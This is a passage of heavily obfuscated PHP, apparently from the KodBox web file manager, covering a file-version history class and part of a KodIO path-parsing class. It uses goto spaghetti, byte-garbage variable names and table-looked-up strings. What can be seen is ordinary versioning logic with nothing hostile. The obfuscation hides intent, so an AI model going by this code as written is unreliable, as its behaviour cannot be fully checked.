TEMP_PATH, BASIC_PATH . $b³ĞŠÉ³µ[1087]); foreach ($E±¯à™§à as $BëÉ—ÑÎ§ˆ) { if (!$e²‹‹³®ÁÄ && substr($Eæ®„ê™Á, 0, strlen($BëÉ—ÑÎ§ˆ)) == $BëÉ—ÑÎ§ˆ) { return !1; } } self::log($GLOBALS[$b³ĞŠÉ³µ[1010]] . $b³ĞŠÉ³µ[1088] . $Eæ®„ê™Á); goto D¦àÇÑéº; fÑäõ„ğÚ: $E¥ŒĞÃ±ğ¢ = KodIO::parse($Eæ®„ê™Á); $e²‹‹³®ÁÄ = $E¥ŒĞÃ±ğ¢[$b³ĞŠÉ³µ[29]]; $eŞÁ¿¥“‚ = !$e²‹‹³®ÁÄ || $e²‹‹³®ÁÄ == KodIO::KOD_IO || $e²‹‹³®ÁÄ == KodIO::KOD_SHARE_ITEM; goto a×Ï‰ğ¿ë“; BÖ†Ğ³µ¯: } private static function pathHistory($dÜªŒºŒî±) { $CÔ†óí =& $_SERVER[ç]; $eƒ×äÓÏø = self::$_historyBase . ltrim(KodIO::clear($dÜªŒºŒî±), $CÔ†óí[8]); $eƒ×äÓÏø = str_replace(array($CÔ†óí[1089]), array($CÔ†óí[1090]), $eƒ×äÓÏø); return $eƒ×äÓÏø; } public static function log($b£Ì§Ï»«) { } public static function historyCount($F†äâ ˆº×) { $E¾˜âÆö =& $_SERVER[ç]; $a¦ÎÍëˆ”£ = array(); $AñÀœ”–õ¥ = array(); foreach ($F†äâ ˆº× as $Dµ½Å‘Í’ó) { $EÇ†¦íèê¼ = get_path_father($Dµ½Å‘Í’ó); if (!$AñÀœ”–õ¥[$EÇ†¦íèê¼]) { $AñÀœ”–õ¥[$EÇ†¦íèê¼] = array(); } $AñÀœ”–õ¥[$EÇ†¦íèê¼][] = get_path_this($Dµ½Å‘Í’ó); } foreach ($AñÀœ”–õ¥ as $EÇ†¦íèê¼ => $E‚¦«ª¼) { $eÄŠĞ¿––Ç = self::parsePath($EÇ†¦íèê¼); if (!$eÄŠĞ¿––Ç) { continue; } foreach ($E‚¦«ª¼ as $e»¦ö¼¬‹½) { $f¼§­–Äœâ = self::listData(rtrim($eÄŠĞ¿––Ç, $E¾˜âÆö[8]) . $E¾˜âÆö[8] . $e»¦ö¼¬‹½, !1); if ($f¼§­–Äœâ && $f¼§­–Äœâ[$E¾˜âÆö[365]]) { $a¦ÎÍëˆ”£[rtrim($EÇ†¦íèê¼, $E¾˜âÆö[8]) . $E¾˜âÆö[8] . $e»¦ö¼¬‹½] = count($f¼§­–Äœâ[$E¾˜âÆö[365]]); } } } return $a¦ÎÍëˆ”£; } public static function add($bµŸ§“ÉÜƒ) { goto B©­¡ˆ‚ê¡; B‹¼õÃ±¥í: if ($DŠäŒ¹×á¹ && $DŠäŒ¹×á¹[0][$FÁÒ¨êÅóğ[170]] == $A»İ½Ó¾„¨) { return !0; } if (array_key_exists($FÁÒ¨êÅóğ[194], $f¡¸²èÄ˜) && !$f¡¸²èÄ˜[$FÁÒ¨êÅóğ[194]]) { return !1; } $f¾«îÊö = short_id(time()); goto cåˆªÃë—Ò; CïëÈÔª‰: if (!$cÜ¦Ë…ùì) { self::clearEmptyFolder($AäµÄ½É¢ç[$FÁÒ¨êÅóğ[1096]]); return !1; } array_unshift($DŠäŒ¹×á¹, $F‰Ş…õ¢åÉ); if (count($DŠäŒ¹×á¹) > $Eäœ¬±ŠÛ¾) { $AÂçï¶¹É = array_slice($DŠäŒ¹×á¹, $Eäœ¬±ŠÛ¾); foreach ($AÂçï¶¹É as $c–ƒß†—³ì) { IO::remove($AäµÄ½É¢ç[$FÁÒ¨êÅóğ[1096]] . $c–ƒß†—³ì[$FÁÒ¨êÅóğ[28]]); } $DŠäŒ¹×á¹ = array_slice($DŠäŒ¹×á¹, 0, $Eäœ¬±ŠÛ¾); } goto aÀ±ö—Èîö; aÀ±ö—Èîö: return self::saveData($AäµÄ½É¢ç[$FÁÒ¨êÅóğ[1097]], $DŠäŒ¹×á¹); goto d‚ØÇÇ¦ë¬; E­‚È±…ó: $DŠäŒ¹×á¹ = $AäµÄ½É¢ç[$FÁÒ¨êÅóğ[365]]; if ($f¡¸²èÄ˜[$FÁÒ¨êÅóğ[77]] == 0) { return; } if ($f¡¸²èÄ˜[$FÁÒ¨êÅóğ[77]] >= 1024 * 1024 * 500) { return !1; } goto B‹¼õÃ±¥í; B¯œß¶ŸÜá: if ($Cñœ–ˆé <= 0) { return; } $A»İ½Ó¾„¨ = IO::hashSimple($bµŸ§“ÉÜƒ); $f¡¸²èÄ˜ = IO::info($bµŸ§“ÉÜƒ); goto E­‚È±…ó; cåˆªÃë—Ò: $F‰Ş…õ¢åÉ = array($FÁÒ¨êÅóğ[388] => $f¾«îÊö, $FÁÒ¨êÅóğ[170] => $A»İ½Ó¾„¨, $FÁÒ¨êÅóğ[28] => $f¡¸²èÄ˜[$FÁÒ¨êÅóğ[28]] . $FÁÒ¨êÅóğ[94] . date($FÁÒ¨êÅóğ[1094]) . rand_string(1), $FÁÒ¨êÅóğ[77] => $f¡¸²èÄ˜[$FÁÒ¨êÅóğ[77]], $FÁÒ¨êÅóğ[426] => USER_ID, $FÁÒ¨êÅóğ[192] => time(), $FÁÒ¨êÅóğ[1095] => $FÁÒ¨êÅóğ[33]); IO::mkdir($AäµÄ½É¢ç[$FÁÒ¨êÅóğ[1096]]); $cÜ¦Ë…ùì = IO::copy($bµŸ§“ÉÜƒ, $AäµÄ½É¢ç[$FÁÒ¨êÅóğ[1096]], !1, $F‰Ş…õ¢åÉ[$FÁÒ¨êÅóğ[28]]); goto CïëÈÔª‰; B©­¡ˆ‚ê¡: $FÁÒ¨êÅóğ =& $_SERVER[ç]; $AäµÄ½É¢ç = self::listData($bµŸ§“ÉÜƒ); if (!$AäµÄ½É¢ç) { return; } goto A¸•È¿ º‹; A¸•È¿ º‹: $aî­…®Ã—¡ = Model($FÁÒ¨êÅóğ[1091])->get($FÁÒ¨êÅóğ[1092]); $Cñœ–ˆé = $GLOBALS[$FÁÒ¨êÅóğ[6]][$FÁÒ¨êÅóğ[87]][$FÁÒ¨êÅóğ[1070]]; $Eäœ¬±ŠÛ¾ = $aî­…®Ã—¡ == $FÁÒ¨êÅóğ[1093] ? 5 : $Cñœ–ˆé; goto B¯œß¶ŸÜá; d‚ØÇÇ¦ë¬: } public static function remove($F†ãö…ÔÎ, $eß©›ïØ¦¨) { $E”¸æ®‹ç =& $_SERVER[ç]; $b“ØŞ¤Ö‹Ó = self::listData($F†ãö…ÔÎ); $bäˆ–¾àÑ = array(); if (!$b“ØŞ¤Ö‹Ó) { return !1; } foreach ($b“ØŞ¤Ö‹Ó[$E”¸æ®‹ç[365]] as $bà¼Š‚§‰“) { if ($bà¼Š‚§‰“[$E”¸æ®‹ç[388]] == $eß©›ïØ¦¨) { IO::remove($b“ØŞ¤Ö‹Ó[$E”¸æ®‹ç[1096]] . $bà¼Š‚§‰“[$E”¸æ®‹ç[28]]); continue; } $bäˆ–¾àÑ[] = $bà¼Š‚§‰“; } return self::saveData($b“ØŞ¤Ö‹Ó[$E”¸æ®‹ç[1097]], $bäˆ–¾àÑ); } public static function clear($bœ˜°éóĞ, $A©ÈŒ˜»Øˆ = true) { $BÎƒ§Íá¸Ç =& $_SERVER[ç]; $fãôÒ™·ä‡ = self::listData($bœ˜°éóĞ, $A©ÈŒ˜»Øˆ); if (!$fãôÒ™·ä‡) { return !1; } foreach ($fãôÒ™·ä‡[$BÎƒ§Íá¸Ç[365]] as $EÇ—ÏÍ×Ê) { IO::remove($fãôÒ™·ä‡[$BÎƒ§Íá¸Ç[1096]] . $EÇ—ÏÍ×Ê[$BÎƒ§Íá¸Ç[28]]); } return self::saveData($fãôÒ™·ä‡[$BÎƒ§Íá¸Ç[1097]], array()); } public static function moveHistory($f„¨×±‹ãÀ, $F¨§†£ = '', $AÌàŠ¥çİ = '') { goto E¼‹©¶ğšŞ; E¼‹©¶ğšŞ: $f© ¼šâÔ =& $_SERVER[ç]; $A‰ĞöËŸ¡ø = self::listData($f„¨×±‹ãÀ, !1); if (!$A‰ĞöËŸ¡ø || !$A‰ĞöËŸ¡ø[$f© ¼šâÔ[365]]) { return !1; } goto C¢ÚëÆİŒÌ; DÉµÅáñÅË: $c¨©·ª·ä = substr(get_path_this($A‰ĞöËŸ¡ø[$f© ¼šâÔ[1097]]), 0, -strlen($a›É‹Ê”®¿)); foreach ($A‰ĞöËŸ¡ø[$f© ¼šâÔ[365]] as $DØÄÉÛ—ï¼ => $F®ë¨‹Ö©) { $eÁÓ¸©…¦“ = $F¨§†£ . substr($F®ë¨‹Ö©[$f© ¼šâÔ[28]], strlen($c¨©·ª·ä)); $DÀè‰¤Ìƒ¸ = IO::move($A‰ĞöËŸ¡ø[$f© ¼šâÔ[1096]] . $F®ë¨‹Ö©[$f© ¼šâÔ[28]], $AÌàŠ¥çİ, !1, $eÁÓ¸©…¦“); if ($DÀè‰¤Ìƒ¸) { $A‰ĞöËŸ¡ø[$f© ¼šâÔ[365]][$DØÄÉÛ—ï¼][$f© ¼šâÔ[28]] = $eÁÓ¸©…¦“; } } $A‰ĞöËŸ¡ø[$f© ¼šâÔ[1097]] = IO::move($A‰ĞöËŸ¡ø[$f© ¼šâÔ[1097]], $AÌàŠ¥çİ, !1, $F¨§†£ . $a›É‹Ê”®¿); goto AùÎ…ÔÌò; AùÎ…ÔÌò: self::saveData($A‰ĞöËŸ¡ø[$f© ¼šâÔ[1097]], $A‰ĞöËŸ¡ø[$f© ¼šâÔ[365]]); self::clearEmptyFolder($A‰ĞöËŸ¡ø[$f© ¼šâÔ[1096]]); goto FÄëİÄôĞ›; C¢ÚëÆİŒÌ: $a›É‹Ê”®¿ = $f© ¼šâÔ[1084]; $F¨§†£ = $F¨§†£ ? $F¨§†£ : get_path_this($f„¨×±‹ãÀ); $AÌàŠ¥çİ = $AÌàŠ¥çİ ? $AÌàŠ¥çİ : $A‰ĞöËŸ¡ø[$f© ¼šâÔ[1096]]; goto DÉµÅáñÅË; FÄëİÄôĞ›: } public static function rollback($E‹ÎÙò¯Œ, $A™ÎË­öŠÓ) { $FÖ†ÑáïÒ÷ =& $_SERVER[ç]; $DÔë¾¸‰Ä = self::listData($E‹ÎÙò¯Œ); if (!$DÔë¾¸‰Ä) { return; } $Bì »Õ†»† = IO::info($E‹ÎÙò¯Œ); foreach ($DÔë¾¸‰Ä[$FÖ†ÑáïÒ÷[365]] as $A‰Á®èÓ¸ => $EëÇó÷·Œ‰) { if ($EëÇó÷·Œ‰[$FÖ†ÑáïÒ÷[388]] == $A™ÎË­öŠÓ) { self::add($E‹ÎÙò¯Œ); $D‹‚Ä»ß‘ø = $DÔë¾¸‰Ä[$FÖ†ÑáïÒ÷[1096]] . $EëÇó÷·Œ‰[$FÖ†ÑáïÒ÷[28]]; $eôºƒ®İ„› = IO::copy($D‹‚Ä»ß‘ø, IO::pathFather($E‹ÎÙò¯Œ), REPEAT_REPLACE, $Bì »Õ†»†[$FÖ†ÑáïÒ÷[28]]); if ($eôºƒ®İ„›) { self::remove($E‹ÎÙò¯Œ, $A™ÎË­öŠÓ); } return $eôºƒ®İ„›; } } return !1; } public static function setDetail($Aùœá·Û†, $dé®ƒéè« , $D¢ÙŒ¦´Û·) { $EÔ¿Ï¡ğÄË =& $_SERVER[ç]; $F‘š›Ûè¸¨ = self::listData($Aùœá·Û†); if (!$F‘š›Ûè¸¨) { return; } foreach ($F‘š›Ûè¸¨[$EÔ¿Ï¡ğÄË[365]] as $f§¢ø½Éøë => $c‘çæ´¨¡Ñ) { if ($c‘çæ´¨¡Ñ[$EÔ¿Ï¡ğÄË[388]] == $dé®ƒéè« ) { $F‘š›Ûè¸¨[$EÔ¿Ï¡ğÄË[365]][$f§¢ø½Éøë][$EÔ¿Ï¡ğÄË[1095]] = $D¢ÙŒ¦´Û·; self::saveData($F‘š›Ûè¸¨[$EÔ¿Ï¡ğÄË[1097]], $F‘š›Ûè¸¨[$EÔ¿Ï¡ğÄË[365]]); return !0; } } return !1; } public static function fileInfo($CšŞğ»ë«ê, $E™Œ×†•Å») { goto c„Á†÷ˆìï; c„Á†÷ˆìï: $E¨‘ä÷¼‚ =& $_SERVER[ç]; $d’Çµ„ï×Í = self::listData($CšŞğ»ë«ê); if (!$d’Çµ„ï×Í) { show_json(LNG($E¨‘ä÷¼‚[104]), !1); } goto DØ“’ä´Å; DØ“’ä´Å: $Fµ¿ç‡Óô« = $E¨‘ä÷¼‚[33]; foreach ($d’Çµ„ï×Í[$E¨‘ä÷¼‚[365]] as $Cï¹÷Êåğ† => $cíË­ÌöÈ) { if ($cíË­ÌöÈ[$E¨‘ä÷¼‚[388]] != $E™Œ×†•Å») { continue; } $Fµ¿ç‡Óô« = $d’Çµ„ï×Í[$E¨‘ä÷¼‚[1096]] . $cíË­ÌöÈ[$E¨‘ä÷¼‚[28]]; break; } if (!$Fµ¿ç‡Óô«) { show_json(LNG($E¨‘ä÷¼‚[104]), !1); } goto E¶Æø°½œç; E¶Æø°½œç: return IO::info($Fµ¿ç‡Óô«); goto a™„Áğ˜«Æ; a™„Áğ˜«Æ: } public static function fileOut($F¥Ø¦±ÆÙ¼, $F’¨ÚÕÄ¥¯, $fò•Óê«ô = false) { $dâÖãÔŒÏ =& $_SERVER[ç]; $Dê·†ºé•Ñ = self::fileInfo($F¥Ø¦±ÆÙ¼, $F’¨ÚÕÄ¥¯); $eÁ î®Ó¸ =& $GLOBALS[$dâÖãÔŒÏ[7]]; $fò•Óê«ô = isset($eÁ î®Ó¸[$dâÖãÔŒÏ[1061]]) && $eÁ î®Ó¸[$dâÖãÔŒÏ[1061]] == 1; if (isset($eÁ î®Ó¸[$dâÖãÔŒÏ[29]]) && $eÁ î®Ó¸[$dâÖãÔŒÏ[29]] == $dâÖãÔŒÏ[1098]) { return IO::fileOutImage($Dê·†ºé•Ñ[$dâÖãÔŒÏ[75]], $eÁ î®Ó¸[$dâÖãÔŒÏ[1099]]); } IO::fileOut($Dê·†ºé•Ñ[$dâÖãÔŒÏ[75]], $fò•Óê«ô, get_path_this($F¥Ø¦±ÆÙ¼)); } public static function listData($bì—‰–Ë¨Û, $B³¡‘Ê…ôñ = true) { goto aËŠÆ¹Ç·; aËŠÆ¹Ç·: $B¡ÚÈ³´© =& $_SERVER[ç]; if ($B³¡‘Ê…ôñ && !IO::exist($bì—‰–Ë¨Û)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto e°İµËØâ; e°İµËØâ: if (substr($bì—‰–Ë¨Û, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $EŠ¶ä¬÷Ú = self::pathHistory($bì—‰–Ë¨Û); $AƒÁÏ¤‡¯» = array($B¡ÚÈ³´©[1097] => $EŠ¶ä¬÷Ú . $B¡ÚÈ³´©[1084], $B¡ÚÈ³´©[1096] => rtrim(get_path_father($EŠ¶ä¬÷Ú), $B¡ÚÈ³´©[8]) . $B¡ÚÈ³´©[8], $B¡ÚÈ³´©[365] => array()); goto fóÂá³Ûİ÷; fóÂá³Ûİ÷: $Dí¼É¬Œ = IO::getContent($AƒÁÏ¤‡¯»[$B¡ÚÈ³´©[1097]]); if ($Dí¼É¬Œ) { $e‰ÌéôÄ‹ = json_decode($Dí¼É¬Œ, !0); if (is_array($e‰ÌéôÄ‹)) { $AƒÁÏ¤‡¯»[$B¡ÚÈ³´©[365]] = $e‰ÌéôÄ‹; } } return $AƒÁÏ¤‡¯»; goto B–Ó¥¿ò“; B–Ó¥¿ò“: } private static function saveData($d„Ò’Æ·Ï, $câĞïª™·Ü) { goto C·°†àóÈĞ; C·°†àóÈĞ: $C¸ëŠÆó‡ =& $_SERVER[ç]; self::log($C¸ëŠÆó‡[1100] . $d„Ò’Æ·Ï . $C¸ëŠÆó‡[67] . count($câĞïª™·Ü), $C¸ëŠÆó‡[697]); if ($câĞïª™·Ü) { return IO::setContent($d„Ò’Æ·Ï, json_encode($câĞïª™·Ü)); } goto FÁÉé™†ƒ¬; c›Ñ£º×™: return !0; goto d÷¤®£ì’Í; FÁÉé™†ƒ¬: $B–ïĞƒ××Ø = IO::pathFather($d„Ò’Æ·Ï); IO::remove($d„Ò’Æ·Ï); self::clearEmptyFolder($B–ïĞƒ××Ø); goto c›Ñ£º×™; d÷¤®£ì’Í: } public static function clearEmptyFolder($A¼Ù™£‚½) { goto C›ù‘àÜÀ„; b Æ”Åƒ«: $EÇ¦ÜƒäÁÙ = IO::has($A¼Ù™£‚½, !0); if ($EÇ¦ÜƒäÁÙ[$a¢ÎåÍ®Øá[201]] > 0 || $EÇ¦ÜƒäÁÙ[$a¢ÎåÍ®Øá[202]] > 0) { return; } IO::remove($A¼Ù™£‚½); goto Eõ¤Ù‰œ“; C›ù‘àÜÀ„: $a¢ÎåÍ®Øá =& $_SERVER[ç]; if (trim($A¼Ù™£‚½, $a¢ÎåÍ®Øá[8]) == trim(self::$_historyBase, $a¢ÎåÍ®Øá[8])) { return; } $bğ×…Í´òÔ = IO::pathFather($A¼Ù™£‚½); goto b Æ”Åƒ«; Eõ¤Ù‰œ“: self::clearEmptyFolder($bğ×…Í´òÔ); goto e÷ŠèƒªÍ; e÷ŠèƒªÍ: } private static function getBasePath() { goto DÚ ìÔ Ï; e²¦Ğ“ÄÅà: file_put_contents($aÉ¹ïåªØ . $EåİÃ‡öŠ[1104], $EåİÃ‡öŠ[33]); Model($EåİÃ‡öŠ[1101])->set($EåİÃ‡öŠ[1102], $aÉ¹ïåªØ); return $aÉ¹ïåªØ; goto dÇÈ«¸ñêÁ; DÚ ìÔ Ï: $EåİÃ‡öŠ =& $_SERVER[ç]; $aÉ¹ïåªØ = Model($EåİÃ‡öŠ[1101])->get($EåİÃ‡öŠ[1102]); if (IO::exist($aÉ¹ïåªØ)) { return $aÉ¹ïåªØ; } goto b…©ÚÍá ; b…©ÚÍá : $aÉ¹ïåªØ = DATA_PATH . $EåİÃ‡öŠ[1103]; $aÉ¹ïåªØ = IO::mkdir($aÉ¹ïåªØ); $aÉ¹ïåªØ = rtrim($aÉ¹ïåªØ, $EåİÃ‡öŠ[8]) . $EåİÃ‡öŠ[8]; goto e²¦Ğ“ÄÅà; dÇÈ«¸ñêÁ: } } class KodIO { const KOD_SOURCE = "\x7b\x73\x6f\165\x72\143\145\x7d"; const KOD_USER_RECYCLE = "\173\x75\x73\145\162\122\145\x63\171\x63\x6c\x65\x7d"; const KOD_USER_FAV = "\173\165\163\145\x72\106\141\166\x7d"; const KOD_USER_FILE_TAG = "\x7b\x75\x73\145\162\106\x69\154\145\x54\141\147\175"; const KOD_USER_FILE_TYPE = "\173\165\x73\x65\162\106\151\154\x65\124\x79\x70\145\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\162\x6f\165\x70\122\157\x6f\164\123\145\x6c\x66\175"; const KOD_USER_SHARE = "\173\165\163\145\x72\x53\x68\141\162\145\x7d"; const KOD_USER_SHARE_LINK = "\x7b\165\x73\x65\x72\x53\150\x61\162\145\x4c\x69\x6e\153\175"; const KOD_USER_SHARE_TO_ME = "\x7b\163\x68\141\162\x65\124\x6f\115\145\x7d"; const KOD_SHARE_ITEM = "\x7b\x73\150\141\x72\145\111\x74\x65\x6d\x7d"; const KOD_SHARE_LINK = "\173\x73\x68\x61\x72\x65\x49\164\145\155\114\x69\x6e\153\175"; const KOD_SEARCH = "\x7b\x73\145\141\162\x63\150\x7d"; const KOD_BLOCK = "\x7b\x62\x6c\157\143\x6b\175"; const KOD_IO = "\173\x69\157\x7d"; const KOD_USER_RECENT = "\173\x75\x73\145\162\122\145\156\x63\145\156\x74\x7d"; const KOD_USER_DRIVER = "\x7b\144\x72\x69\x76\x65\x72\x7d"; public static function typeList() { $cè›Ü¹âªï =& $_SERVER[ç]; return array($cè›Ü¹âªï[1105] => self::KOD_SOURCE, $cè›Ü¹âªï[1106] => self::KOD_USER_RECYCLE, $cè›Ü¹âªï[1107] => self::KOD_USER_FAV, $cè›Ü¹âªï[1108] => self::KOD_USER_FILE_TAG, $cè›Ü¹âªï[1109] => self::KOD_USER_FILE_TYPE, $cè›Ü¹âªï[1110] => self::KOD_GROUP_ROOT_SELF, $cè›Ü¹âªï[1111] => self::KOD_USER_SHARE, $cè›Ü¹âªï[1112] => self::KOD_USER_SHARE_LINK, $cè›Ü¹âªï[1113] => self::KOD_USER_SHARE_TO_ME, $cè›Ü¹âªï[1114] => self::KOD_SHARE_ITEM, $cè›Ü¹âªï[1115] => self::KOD_SHARE_LINK, $cè›Ü¹âªï[1116] => self::KOD_SEARCH, $cè›Ü¹âªï[1117] => self::KOD_BLOCK, $cè›Ü¹âªï[1118] => self::KOD_IO, $cè›Ü¹âªï[1119] => self::KOD_USER_RECENT, $cè›Ü¹âªï[1120] => self::KOD_USER_DRIVER); } public static function parse($aÉáÙÉ±ºš) { goto B²›¡ñé; B²›¡ñé: $DªªŒ×¸áè =& $_SERVER[ç]; $aÉáÙÉ±ºš = self::clear($aÉáÙÉ±ºš); $F«¥¸È„‡¬ = array_values(self::typeList()); goto e‡Õ®ßÒ¡ï; e‡Õ®ßÒ¡ï: preg_match($DªªŒ×¸áè[1121], $aÉáÙÉ±ºš, $E×Ÿ¬ˆ×ñ·); $BÊô×‡©æà = array($DªªŒ×¸áè[409] => !1, $DªªŒ×¸áè[1122] => !1, $DªªŒ×¸áè[406] => !1, $DªªŒ×¸áè[75] => $aÉáÙÉ±ºš, $DªªŒ×¸áè[1032] => !1, $DªªŒ×¸áè[1031] => $DªªŒ×¸áè[33]); if (is_array($E×Ÿ¬ˆ×ñ·) && count($E×Ÿ¬ˆ×ñ·) == 5) { $DÓªŸÌÉâ = $DªªŒ×¸áè[1123] . $E×Ÿ¬ˆ×ñ·[2] . $DªªŒ×¸áè[323]; if (in_array($DÓªŸÌÉâ, $F«¥¸È„‡¬)) { $BÊô×‡©æà[$DªªŒ×¸áè[1032]] = $E×Ÿ¬ˆ×ñ·[1]; $BÊô×‡©æà[$DªªŒ×¸áè[29]] = $DÓªŸÌÉâ; $BÊô×‡©æà[$DªªŒ×¸áè[1124]] = substr($DÓªŸÌÉâ, 1, -1); $BÊô×‡©æà[$DªªŒ×¸áè[388]] = $E×Ÿ¬ˆ×ñ·[3]; } $BÊô×‡©æà[$DªªŒ×¸áè[1031]] = $E×Ÿ¬ˆ×ñ·[4]; } goto eçÖó‰ù†İ; eçÖó‰ù†İ: $dß»Ø¿ºÖ = array($DªªŒ×¸áè[33], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $BÊô×‡©æà[$DªªŒ×¸áè[1086]] = in_array($BÊô×‡©æà[$DªªŒ×¸áè[29]], $dß»Ø¿ºÖ); return $BÊô×‡©æà; goto eÔ³ËêÈƒ; eÔ³ËêÈƒ: } public static function isTruePath($BäØİ«”‹) { goto fŒäù¸„·; cºğÎªğ™£: if (strpos($BäØİ«”‹, $c•Âë„‚É‘[1089]) === 0) { return !0; } if (strpos($BäØİ«”‹, $c•Âë„‚É‘[1125]) === 0) { return !0; } if (strpos($BäØİ«”‹, $c•Âë„‚É‘[1125]) === 0) { return !0; } goto E©°éŒÅñ; fŒäù¸„·: $c•Âë„‚É‘ =& $_SERVER[ç]; if (substr($BäØİ«”‹, 0, 1) != $c•Âë„‚É‘[1123]) { return !0; } if (strpos($BäØİ«”‹, $c•Âë„‚É‘[395]) === 0) { return !0; } goto cºğÎªğ™£; E©°éŒÅñ: if (strpos($BäØİ«”‹, $c•Âë„‚É‘[1126]) === 0) { return !0; } return !1; goto bî‡ËÜÅ‰ß; bî‡ËÜÅ‰ß: } public static function clear($eËè½ö¯£) { goto Fˆ™’†¼—é; cÕéĞ¦½Ö: return $eËè½ö¯£; goto E³àçŒÑŞ; FÈçğ»ˆ„: $f´Õƒ»«Ë‚ = $fŸï´ÓÁ”é[1127]; if (substr($eËè½ö¯£, 0, 3) == $fŸï´ÓÁ”é[1128]) { $eËè½ö¯£ = substr($eËè½ö¯£, 3); } while (strstr($eËè½ö¯£, $f´Õƒ»«Ë‚)) { $eËè½ö¯£ = str_replace($f´Õƒ»«Ë‚, $fŸï´ÓÁ”é[8], $eËè½ö¯£); } goto d‹¨©Ğèˆ’; d‹¨©Ğèˆ’: $eËè½ö¯£ = preg_replace($fŸï´ÓÁ”é[1129], $fŸï´ÓÁ”é[8], $eËè½ö¯£); if ($eËè½ö¯£ == $fŸï´ÓÁ”é[8]) { return $fŸï´ÓÁ”é[8]; } $eËè½ö¯£ = rtrim($eËè½ö¯£, $fŸï´ÓÁ”é[8]); goto cÕéĞ¦½Ö; Fˆ™’†¼—é: $fŸï´ÓÁ”é =& $_SERVER[ç]; $eËè½ö¯£ = str_replace(array($fŸï´ÓÁ”é[1005], $fŸï´ÓÁ”é[227]), $fŸï´ÓÁ”é[50], $eËè½ö¯£); $eËè½ö¯£ = str_replace($fŸï´ÓÁ”é[96], $fŸï´ÓÁ”é[8], $eËè½ö¯£); goto FÈçğ»ˆ„; E³àçŒÑŞ: } public static function sourceID($c«›éŠó„‹) { $DËÖ—èëŒ¿ =& $_SERVER[ç]; $aÎá‹ô³Ú = self::parse($c«›éŠó„‹); if ($aÎá‹ô³Ú[$DËÖ—èëŒ¿[29]] !== self::KOD_SOURCE) { show_json(LNG($DËÖ—èëŒ¿[1130]), !1); } return $aÎá‹ô³Ú[$DËÖ—èëŒ¿[388]]; } public static function make($FÀ°â³ÆÕ±) { if (!$FÀ°â³ÆÕ±) { return !1; } return self::makePath(self::KOD_SOURCE, intval($FÀ°â³ÆÕ±)); } public static function makeShare($a‰åŠÀ…×, $Cì”ù´™¨É) { return self::makePath(self::KOD_SHARE_ITEM, $a‰åŠÀ…×, $Cì”ù´™¨É); } public static function makeFileTypePath($a˜öÈØ¿†) { return self::makePath(self::KOD_USER_FILE_TYPE, $a˜öÈØ¿†); } public static function makeFileTagPath($E•Ê¼âİ) { return self::makePath(self::KOD_USER_FILE_TAG, $E•Ê¼âİ); } public static function makePath($c¢»ô †ØŸ, $B¦¼Öˆœğ› = '', $Aœê’ÉÄ¨ = '') { $A Ÿ¸Í³­Í =& $_SERVER[ç]; $dÏôëÉ£š• = substr($c¢»ô †ØŸ, 1, -1); $A××ÓÖØª– = $A Ÿ¸Í³­Í[1131] . $dÏôëÉ£š• . $A Ÿ¸Í³­Í[1132] . $B¦¼Öˆœğ› . $A Ÿ¸Í³­Í[1133]; $A××ÓÖØª– = $Aœê’ÉÄ¨ ? $A××ÓÖØª– . $Aœê’ÉÄ¨ . $A Ÿ¸Í³­Í[8] : $A××ÓÖØª–; return $A××ÓÖØª–; } public static function hashPath($Cå¡’ÈóÍ) { $dÃ‰ìø’¨™ =& $_SERVER[ç]; $F©ÎäÒŒÅÆ = is_array($Cå¡’ÈóÍ) ? $Cå¡’ÈóÍ : IO::info($Cå¡’ÈóÍ); $aî¤…¯‡Á = _get($F©ÎäÒŒÅÆ, $dÃ‰ìø’¨™[1134], $dÃ‰ìø’¨™[33]); if (!$aî¤…¯‡Á) { $Fºí‘®Ï³ = KodIO::parse($F©ÎäÒŒÅÆ[$dÃ‰ìø’¨™[75]]); if (!$Fºí‘®Ï³[$dÃ‰ìø’¨™[29]]) { $aî¤…¯‡Á = IO::hashSimple($F©ÎäÒŒÅÆ[$dÃ‰ìø’¨™[75]]); } } if (!$aî¤…¯‡Á) { $aî¤…¯‡Á = md5($F©ÎäÒŒÅÆ[$dÃ‰ìø’¨™[75]] . $F©ÎäÒŒÅÆ[$dÃ‰ìø’¨™[77]] . $F©ÎäÒŒÅÆ[$dÃ‰ìø’¨™[83]]); } return $aî¤…¯‡Á; } public static function initSystemPath() { goto c¹ñ”‰Ñ˜Ñ; c¹ñ”‰Ñ˜Ñ: $bÚ‹Ëî›„ğ =& $_SERVER[ç]; if (defined($bÚ‹Ëî›„ğ[1135])) { return; } define($bÚ‹Ëî›„ğ[1135], self::systemPath($bÚ‹Ëî›„ğ[1136])); goto C„ÍàÌ®×¬; d®·Ä×õœí: IOHistory::bindEvent(); goto DößÖŸÌ°; C„ÍàÌ®×¬: define($bÚ‹Ëî›„ğ[1137], self::systemPath($bÚ‹Ëî›„ğ[1138])); define($bÚ‹Ëî›„ğ[1139], self::systemPath($bÚ‹Ëî›„ğ[1140])); define($bÚ‹Ëî›„ğ[1141], self::systemPath($bÚ‹Ëî›„ğ[1142])); goto d®·Ä×õœí; DößÖŸÌ°: } public static function systemPath($A¢ö˜ƒ¶÷) { goto Eº›É„ ¡; Eº›É„ ¡: $D§‹ší‡óÍ =& $_SERVER[ç]; $dÕ«ò§ï©ó = $D§‹ší‡óÍ[1143] . ucfirst($A¢ö˜ƒ¶÷); $E½À¥áÜØË = Model($D§‹ší‡óÍ[1091])->get($dÕ«ò§ï©ó); goto BÌöŠ”÷; BÌöŠ”÷: if ($E½À¥áÜØË) { return $E½À¥áÜØË; } if ($A¢ö˜ƒ¶÷ == $D§‹ší‡óÍ[1136]) { $E½À¥áÜØË = self::make(Model($D§‹ší‡óÍ[760])->systemRootPathAdd($D§‹ší‡óÍ[500])); } else { $E½À¥áÜØË = self::systemPath($D§‹ší‡óÍ[1136]); $e…‰ç˜¹Ïˆ = self::sourceID($E½À¥áÜØË); $E½À¥áÜØË = self::make(Model($D§‹ší‡óÍ[760])->mkdir($e…‰ç˜¹Ïˆ, $A¢ö˜ƒ¶÷)); } Model($D§‹ší‡óÍ[1091])->set($dÕ«ò§ï©ó, $E½À¥áÜØË); goto c¿Éˆ£ùì‚; c¿Éˆ£ùì‚: return $E½À¥áÜØË; goto cÀÑÎ¾¾ ; cÀÑÎ¾¾ : } public static function 